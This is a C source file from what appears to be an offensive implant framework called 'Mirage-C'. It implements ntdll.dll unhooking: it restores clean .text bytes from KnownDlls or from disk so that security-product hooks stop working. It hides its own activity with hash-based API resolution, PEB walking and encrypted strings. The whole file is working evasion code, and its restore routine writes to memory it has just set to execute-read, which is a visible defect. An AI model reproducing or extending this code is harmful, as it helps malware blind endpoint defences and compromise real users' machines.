/*
 * unhook.c — NTDLL .text section unhooking for Mirage-C
 *
 * Reads a clean ntdll.dll from disk or via KnownDlls section object,
 * finds the .text section in both the current (hooked) and fresh copy,
 * then overwrites the hooked bytes with the originals.
 *
 * CRT-free — uses PEB-walk for module/function resolution and mirage_Nt*
 * wrappers for syscalls.
 */

#include "unhook.h"
#include "config.h"
#include "engine.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include "nt_types.h"

/* ── PE constants ──────────────────────────────────────────────── */
#ifndef IMAGE_SCN_MEM_EXECUTE
#define IMAGE_SCN_MEM_EXECUTE  0x20000000
#endif

#ifndef PAGE_EXECUTE_READ
#define PAGE_EXECUTE_READ      0x20
#endif
#ifndef PAGE_READWRITE
#define PAGE_READWRITE         0x04
#endif
#ifndef SECTION_MAP_READ
#define SECTION_MAP_READ       0x0004
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE   0x00000040
#endif

#ifndef FILE_SHARE_READ
#define FILE_SHARE_READ        0x00000001
#endif
#ifndef FILE_OPEN
#define FILE_OPEN              1
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif
#ifndef MEM_COMMIT
#define MEM_COMMIT             0x00001000
#endif
#ifndef MEM_RELEASE
#define MEM_RELEASE            0x00008000
#endif
#ifndef FILE_ATTRIBUTE_NORMAL
#define FILE_ATTRIBUTE_NORMAL  0x00000080
#endif

/* ── NTSTATUS helpers ──────────────────────────────────────────── */
#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)

/* Encrypted NT function names: enc_strings.h (restored, key-consistent —
 * the previous inline copies decrypted to garbage). */

/* ── NT path strings ───────────────────────────────────────────── */
/* ponytail: plaintext WCHAR paths — small and obfuscation benefit
 * is marginal for paths anyway. Encrypt if signature matters. */
static const WCHAR g_knowndlls_path[] =
    L"\\KnownDlls\\ntdll.dll";

static const WCHAR g_ntdll_filepath[] =
    L"\\??\\C:\\Windows\\System32\\ntdll.dll";

/* ── Static state for backup/restore ──────────────────────────── */
static uint8_t *g_backup_text  = NULL;
static SIZE_T   g_backup_size  = 0;
static uint8_t *g_text_va      = NULL;
static ULONG    g_old_protect  = 0;
static int      g_unhooked     = 0;

/* ── Helpers ───────────────────────────────────────────────────── */

/*
 * resolve_ntdll_func — Get function pointer from ntdll's export table.
 */
static void* resolve_ntdll_func(void* ntdll_base, const uint8_t* enc_name, size_t enc_len)
{
    char name[64];
    enc_decrypt(enc_name, enc_len, name);
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(ntdll_base, h);
}

/*
 * find_text_section — Walk PE headers to locate .text section bounds.
 * Returns virtual address and size through out_va/out_size.
 * Returns 1 on success, 0 on failure.
 */
static int find_text_section(void* base, uint8_t** out_va, SIZE_T* out_size)
{
    uint8_t* bp = (uint8_t*)base;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)bp;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(bp + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    uint16_t ns = nt->FileHeader.NumberOfSections;

    for (uint16_t i = 0; i < ns; i++) {
        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            sec[i].Misc.VirtualSize > 0) {
            *out_va   = bp + sec[i].VirtualAddress;
            *out_size = sec[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

/* ── Path 1: NtOpenSection on \\KnownDlls\\ntdll.dll ───────────── */

static int unhook_via_section(void* ntdll_base)
{
    char fn[32];

    /* Resolve NtOpenSection */
    void* pNtOpenSection = resolve_ntdll_func(ntdll_base,
        enc_unhook_NtOpenSection, ENC_UNHOOK_NTOPENSECTION_LEN);
    if (!pNtOpenSection) return 0;

    /* Resolve NtMapViewOfSection */
    enc_decrypt(enc_NtMapViewOfSection, ENC_NTMAPVIEWOFSECTION_LEN, fn);
    uint32_t h = mirage_encrypted_hash_func(fn);
    void* pNtMapViewOfSection = mirage_get_function_by_hash(ntdll_base, h);
    if (!pNtMapViewOfSection) return 0;

    /* Resolve NtUnmapViewOfSection */
    enc_decrypt(enc_NtUnmapViewOfSection, ENC_NTUNMAPVIEWOFSECTION_LEN, fn);
    h = mirage_encrypted_hash_func(fn);
    void* pNtUnmapViewOfSection = mirage_get_function_by_hash(ntdll_base, h);
    if (!pNtUnmapViewOfSection) return 0;

    /* Build OBJECT_ATTRIBUTES for \\KnownDlls\\ntdll.dll */
    UNICODE_STRING us;
    us.Length        = (uint16_t)(wcslen(g_knowndlls_path) * sizeof(WCHAR));
    us.MaximumLength = us.Length + sizeof(WCHAR);
    us.Buffer        = (PWSTR)g_knowndlls_path;

    OBJECT_ATTRIBUTES oa;
    oa.Length                   = sizeof(oa);
    oa.RootDirectory            = NULL;
    oa.ObjectName               = &us;
    oa.Attributes               = OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor       = NULL;
    oa.SecurityQualityOfService = NULL;

    /* NtOpenSection */
    typedef NTSTATUS (NTAPI *pNtOpenSection_t)(
        HANDLE*, ULONG, OBJECT_ATTRIBUTES*);
    HANDLE hSection = NULL;
    NTSTATUS st = ((pNtOpenSection_t)pNtOpenSection)(
        &hSection, SECTION_MAP_READ, &oa);
    if (!NT_SUCCESS(st) || !hSection) return 0;

    /* NtMapViewOfSection */
    typedef NTSTATUS (NTAPI *pNtMapViewOfSection_t)(
        HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
        LARGE_INTEGER*, SIZE_T*, ULONG, ULONG, ULONG);
    PVOID viewBase   = NULL;
    SIZE_T viewSize  = 0;
    LARGE_INTEGER off = { 0 };

    st = ((pNtMapViewOfSection_t)pNtMapViewOfSection)(
        hSection, (HANDLE)(intptr_t)(-1), /* current process */
        &viewBase, 0, 0, &off, &viewSize,
        1 /* ViewUnmap */, 0, PAGE_READONLY);
    mirage_NtClose(hSection);

    if (!NT_SUCCESS(st) || !viewBase) return 0;

    /* Find .text in the freshly mapped view */
    uint8_t* clean_va = NULL;
    SIZE_T   clean_sz = 0;
    if (!find_text_section(viewBase, &clean_va, &clean_sz)) {
        typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection_t)(
            HANDLE, PVOID);
        ((pNtUnmapViewOfSection_t)pNtUnmapViewOfSection)(
            (HANDLE)(intptr_t)(-1), viewBase);
        return 0;
    }

    /* Make current .text writable */
    SIZE_T regionSz = g_backup_size;
    PVOID  bp       = g_text_va;
    st = mirage_NtProtectVirtualMemory((HANDLE)(intptr_t)(-1),
        &bp, &regionSz, PAGE_READWRITE, &g_old_protect);
    if (!NT_SUCCESS(st)) {
        typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection_t)(
            HANDLE, PVOID);
        ((pNtUnmapViewOfSection_t)pNtUnmapViewOfSection)(
            (HANDLE)(intptr_t)(-1), viewBase);
        return 0;
    }

    /* Copy clean .text over current */
    SIZE_T copySz = (clean_sz < g_backup_size) ? clean_sz : g_backup_size;
    for (SIZE_T i = 0; i < copySz; i++)
        g_text_va[i] = clean_va[i];

    /* Restore protection */
    regionSz = g_backup_size;
    bp       = g_text_va;
    ULONG old2;
    mirage_NtProtectVirtualMemory((HANDLE)(intptr_t)(-1),
        &bp, &regionSz, g_old_protect, &old2);

    /* Flush instruction cache */
    mirage_NtFlushInstructionCache((HANDLE)(intptr_t)(-1),
        g_text_va, g_backup_size);

    /* Unmap the fresh view */
    {
        typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection_t)(
            HANDLE, PVOID);
        ((pNtUnmapViewOfSection_t)pNtUnmapViewOfSection)(
            (HANDLE)(intptr_t)(-1), viewBase);
    }

    g_unhooked = 1;
    return 1;
}

/* ── Path 2: NtCreateFile → manual PE parse ────────────────────── */

static int unhook_via_file(void* ntdll_base)
{
    /* Resolve NtReadFile for file I/O */
    void* pNtReadFile = resolve_ntdll_func(ntdll_base,
        enc_unhook_NtReadFile, ENC_UNHOOK_NTREADFILE_LEN);
    if (!pNtReadFile) return 0;

    /* Build OBJECT_ATTRIBUTES for the file path */
    UNICODE_STRING fus;
    fus.Length        = (uint16_t)(wcslen(g_ntdll_filepath) * sizeof(WCHAR));
    fus.MaximumLength = fus.Length + sizeof(WCHAR);
    fus.Buffer        = (PWSTR)g_ntdll_filepath;

    OBJECT_ATTRIBUTES foa;
    foa.Length                   = sizeof(foa);
    foa.RootDirectory            = NULL;
    foa.ObjectName               = &fus;
    foa.Attributes               = OBJ_CASE_INSENSITIVE;
    foa.SecurityDescriptor       = NULL;
    foa.SecurityQualityOfService = NULL;

    /* NtCreateFile to open ntdll.dll for reading */
    HANDLE hFile    = NULL;
    IO_STATUS_BLOCK iosb;

    NTSTATUS st = mirage_NtCreateFile(&hFile,
        0x80100000 /* SYNCHRONIZE | FILE_READ_DATA */,
        &foa, &iosb, NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0);

    if (!NT_SUCCESS(st) || !hFile) return 0;

    /* Read file into buffer */
    typedef NTSTATUS (NTAPI *pNtReadFile_t)(
        HANDLE, HANDLE, PVOID, PVOID,
        IO_STATUS_BLOCK*, PVOID, ULONG,
        LARGE_INTEGER*, ULONG*);

    /* ponytail: 4 MiB buffer — ntdll.dll is ~2 MiB, safe */
#define UNHOOK_FILE_BUF_SZ  (4 * 1024 * 1024)

    PVOID fileBuf = NULL;
    SIZE_T allocSz = UNHOOK_FILE_BUF_SZ;
    st = mirage_NtAllocateVirtualMemory((HANDLE)(intptr_t)(-1),
        &fileBuf, 0, &allocSz, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(st) || !fileBuf) {
        mirage_NtClose(hFile);
        return 0;
    }

    LARGE_INTEGER byteOff = { 0 };
    st = ((pNtReadFile_t)pNtReadFile)(
        hFile, NULL, NULL, NULL, &iosb,
        fileBuf, UNHOOK_FILE_BUF_SZ,
        &byteOff, NULL);
    mirage_NtClose(hFile);

    if (!NT_SUCCESS(st)) {
        SIZE_T freeSz = 0;
        mirage_NtFreeVirtualMemory((HANDLE)(intptr_t)(-1),
            &fileBuf, &freeSz, MEM_RELEASE);
        return 0;
    }

    SIZE_T bytesRead = (SIZE_T)iosb.Information;

    /* Verify DOS/NT headers in file buffer */
    uint8_t* fbp = (uint8_t*)fileBuf;
    if (fbp[0] != 'M' || fbp[1] != 'Z') goto file_cleanup;

    uint32_t lfa = *(uint32_t*)(fbp + 0x3C);
    if (fbp[lfa] != 'P' || fbp[lfa+1] != 'E') goto file_cleanup;

    /* Parse sections to find .text */
    IMAGE_NT_HEADERS64* fnt = (IMAGE_NT_HEADERS64*)(fbp + lfa);
    IMAGE_SECTION_HEADER* fsec = IMAGE_FIRST_SECTION(fnt);
    uint16_t fns = fnt->FileHeader.NumberOfSections;

    /* Find .text raw offset and size in the file */
    uint32_t textRawOff  = 0;
    uint32_t textRawSize = 0;
    for (uint16_t i = 0; i < fns; i++) {
        if ((fsec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            fsec[i].Misc.VirtualSize > 0) {
            textRawOff  = fsec[i].PointerToRawData;
            textRawSize = fsec[i].SizeOfRawData;
            /* Prefer virtual size if smaller (exact code size) */
            if (fsec[i].Misc.VirtualSize < textRawSize)
                textRawSize = fsec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!textRawOff || !textRawSize) goto file_cleanup;
    if ((SIZE_T)(textRawOff + textRawSize) > bytesRead) goto file_cleanup;

    uint8_t* cleanRaw = fbp + textRawOff;

    /* Make current .text writable */
    SIZE_T regionSz = g_backup_size;
    PVOID  bp       = g_text_va;
    st = mirage_NtProtectVirtualMemory((HANDLE)(intptr_t)(-1),
        &bp, &regionSz, PAGE_READWRITE, &g_old_protect);
    if (!NT_SUCCESS(st)) goto file_cleanup;

    /* Copy clean bytes */
    SIZE_T copySz = (textRawSize < g_backup_size) ? textRawSize : g_backup_size;
    for (SIZE_T i = 0; i < copySz; i++)
        g_text_va[i] = cleanRaw[i];

    /* Restore protection */
    regionSz = g_backup_size;
    bp       = g_text_va;
    ULONG old2;
    mirage_NtProtectVirtualMemory((HANDLE)(intptr_t)(-1),
        &bp, &regionSz, g_old_protect, &old2);

    mirage_NtFlushInstructionCache((HANDLE)(intptr_t)(-1),
        g_text_va, g_backup_size);

    g_unhooked = 1;

file_cleanup:
    {
        SIZE_T freeSz = 0;
        mirage_NtFreeVirtualMemory((HANDLE)(intptr_t)(-1),
            &fileBuf, &freeSz, MEM_RELEASE);
    }
    return g_unhooked;
}

/* ── Public API ─────────────────────────────────────────────────── */

int unhook_ntdll(void)
{
    if (g_unhooked) return 1;

    /* Get ntdll base via PEB walk */
    char dll[32];
    enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll);
    void* ntdll_base = mirage_get_module_by_hash(
        mirage_encrypted_hash_module(dll));
    if (!ntdll_base) return 0;

    /* Find current .text section */
    if (!find_text_section(ntdll_base, &g_text_va, &g_backup_size))
        return 0;

    /* Allocate backup buffer */
    SIZE_T allocSz = g_backup_size;
    PVOID  allocVa = NULL;
    NTSTATUS st = mirage_NtAllocateVirtualMemory(
        (HANDLE)(intptr_t)(-1), &allocVa, 0,
        &allocSz, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(st) || !allocVa) return 0;
    g_backup_text = (uint8_t*)allocVa;

    /* Copy original .text into backup */
    for (SIZE_T i = 0; i < g_backup_size; i++)
        g_backup_text[i] = g_text_va[i];

    /* Try section path first, then file fallback */
    if (unhook_via_section(ntdll_base))
        return 1;

    return unhook_via_file(ntdll_base);
}

void restore_ntdll(void)
{
    if (!g_unhooked || !g_backup_text || !g_backup_size)
        return;

    SIZE_T regionSz = g_backup_size;
    PVOID  bp       = g_text_va;
    g_old_protect   = 0;
    mirage_NtProtectVirtualMemory((HANDLE)(intptr_t)(-1),
        &bp, &regionSz, PAGE_EXECUTE_READ, &g_old_protect);

    for (SIZE_T i = 0; i < g_backup_size; i++)
        g_text_va[i] = g_backup_text[i];

    regionSz = g_backup_size;
    bp       = g_text_va;
    ULONG old2;
    mirage_NtProtectVirtualMemory((HANDLE)(intptr_t)(-1),
        &bp, &regionSz, g_old_protect, &old2);

    mirage_NtFlushInstructionCache((HANDLE)(intptr_t)(-1),
        g_text_va, g_backup_size);

    SIZE_T freeSz = 0;
    mirage_NtFreeVirtualMemory((HANDLE)(intptr_t)(-1),
        (PVOID*)&g_backup_text, &freeSz, MEM_RELEASE);

    g_backup_text = NULL;
    g_backup_size = 0;
    g_text_va     = NULL;
    g_unhooked    = 0;
}
